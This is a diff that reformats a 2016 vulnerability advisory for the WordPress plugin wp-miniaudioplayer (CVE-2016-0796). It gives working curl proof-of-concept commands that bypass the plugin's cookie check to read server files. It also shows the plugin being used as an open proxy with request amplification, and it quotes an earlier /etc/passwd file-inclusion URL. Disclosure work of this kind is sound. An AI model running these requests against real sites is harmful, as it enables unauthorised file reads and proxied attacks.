@@ -1,47 +1,56 @@
-                                Advisory #: 162
-Title: Open Proxy & Authentication by pass for wordpress plugin wp-
-miniaudioplayer v1.7.6
-Author:Larry W. Cashdollar, @_larry0
-Date: 2016-02-01
-Download Site: https://wordpress.org/plugins/wp-miniaudioplayer
-Vendor: https://profiles.wordpress.org/pupunzi/
-Vendor Notified: 2016-02-12
-Vendor Contact: @pupunzi
-Description: Transform your mp3 audio files into a nice, small light HTML5
-player.
-Vulnerability:
-The code in map_download.php was improperly patched to fix an LFI vulnerability
-reported here: http://0day.today/exploit/24536 That POC was: http://victim.com/
-wp-content/plugins/wp-miniaudioplayer/map_download.php?fi leurl=/etc/passwd The
-fix had faulty authentication code in map_download.php that can easily be
-bypassed by setting The required cookie: 8 if(!isset($_COOKIE["mapdownload"]) ||
-$_COOKIE["mapdownload"] !== "true") 9 die ($_COOKIE["mapdownload"].'
-<b>Something goes wrong, you don\'t have permission to use this page, sorry.</
-b>') ; A vulnerable installation of this plugin can be used to download files
-with the extension mp3,mp4a,wav and ogg from any where the web server
-application has read access to the system: PoC 1: $ curl "http://wpsite/wp-
-content/plugins/wp-miniaudioplayer/map_download.php?fileu rl=/tmp/
-s3kr3t_audio_file.mp3" --cookie "mapdownload=true” I also noticed with the use
-of fopen() you have the ability to also fetch URLs which would allow a malicious
-person to use this plugin as a blind proxy. You could download mp3’s through it
-or use it to proxy attacks via HTTP GET requests. Since the code to check the
-file extension is done after the request is made you can get two Request to the
-target server regardless of the file extension restrictions: $ curl "http://
-192.168.0.2/wp-content/plugins/wp-miniaudioplayer/map_download.php?
-fileurl=http://192.168.0.3/tee".php" --cookie "mapdownload=true 192.168.0.2 - -
-[02/Feb/2016:21:52:32 -0500] "GET /test.php HTTP/1.0" 200 187 "-" "-
-" 192.168.0.2 - - [02/Feb/2016:21:52:32 -0500] "GET /test.php HTTP/1.0" 200 187
-"-" "-" So 2x DoS amplification, the first is to check if the file exists and
-the second is to finally read data from the file.
-CVE-2016-0796
-JSON:Export
-Exploit Code:
-   1. curl "http://wpsite/wp-content/plugins/wp-miniaudioplayer/
-      map_download.php?fileurl=/tmp/s3kr3t_audio_file.mp3"  --cookie
-      "mapdownload=trueâ
-   2. curl "http://192.168.0.2/wp-content/plugins/wp-miniaudioplayer/
-      map_download.php? fileurl=http://192.168.0.3/tee".php"  --cookie
-      "mapdownload=true
-   3.  
-Screen Shots:
-Advisory: http://www.vapidlabs.com/advisory.php?v=162
+
+                               Advisory #: 162
+
+   Title: Open Proxy & Authentication by pass for wordpress plugin
+   wp-miniaudioplayer v1.7.6
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2016-02-01
+   Download Site: https://wordpress.org/plugins/wp-miniaudioplayer
+   Vendor: https://profiles.wordpress.org/pupunzi/
+   Vendor Notified: 2016-02-12
+   Vendor Contact: @pupunzi
+   Description: Transform your mp3 audio files into a nice, small light
+   HTML5 player.
+   Vulnerability:
+   The code in map_download.php was improperly patched to fix an LFI
+   vulnerability reported here: http://0day.today/exploit/24536 That POC
+   was:
+   http://victim.com/wp-content/plugins/wp-miniaudioplayer/map_download.ph
+   p?fi leurl=/etc/passwd The fix had faulty authentication code in
+   map_download.php that can easily be bypassed by setting The required
+   cookie: 8 if(!isset($_COOKIE["mapdownload"]) || $_COOKIE["mapdownload"]
+   !== "true") 9 die ($_COOKIE["mapdownload"].' <b>Something goes wrong,
+   you don\'t have permission to use this page, sorry.</b>') ; A
+   vulnerable installation of this plugin can be used to download files
+   with the extension mp3,mp4a,wav and ogg from any where the web server
+   application has read access to the system: PoC 1: $ curl
+   "http://wpsite/wp-content/plugins/wp-miniaudioplayer/map_download.php?f
+   ileu rl=/tmp/s3kr3t_audio_file.mp3" --cookie "mapdownload=true” I also
+   noticed with the use of fopen() you have the ability to also fetch URLs
+   which would allow a malicious person to use this plugin as a blind
+   proxy. You could download mp3’s through it or use it to proxy attacks
+   via HTTP GET requests. Since the code to check the file extension is
+   done after the request is made you can get two Request to the target
+   server regardless of the file extension restrictions: $ curl
+   "http://192.168.0.2/wp-content/plugins/wp-miniaudioplayer/map_download.
+   php? fileurl=http://192.168.0.3/tee".php" --cookie "mapdownload=true
+   192.168.0.2 - - [02/Feb/2016:21:52:32 -0500] "GET /test.php HTTP/1.0"
+   200 187 "-" "-" 192.168.0.2 - - [02/Feb/2016:21:52:32 -0500] "GET
+   /test.php HTTP/1.0" 200 187 "-" "-" So 2x DoS amplification, the first
+   is to check if the file exists and the second is to finally read data
+   from the file.
+   CVE-2016-0796
+   JSON: Export
+   Exploit Code:
+
+    1. curl
+       "http://wpsite/wp-content/plugins/wp-miniaudioplayer/map_download.p
+       hp?fileurl=/tmp/s3kr3t_audio_file.mp3" --cookie "mapdownload=true”
+    2. curl
+       "http://192.168.0.2/wp-content/plugins/wp-miniaudioplayer/map_downl
+       oad.php? fileurl=http://192.168.0.3/tee".php" --cookie
+       "mapdownload=true
+    3.
+
+   Screen Shots:
+   Advisory: http://www.vapidlabs.com/advisory.php?v=162
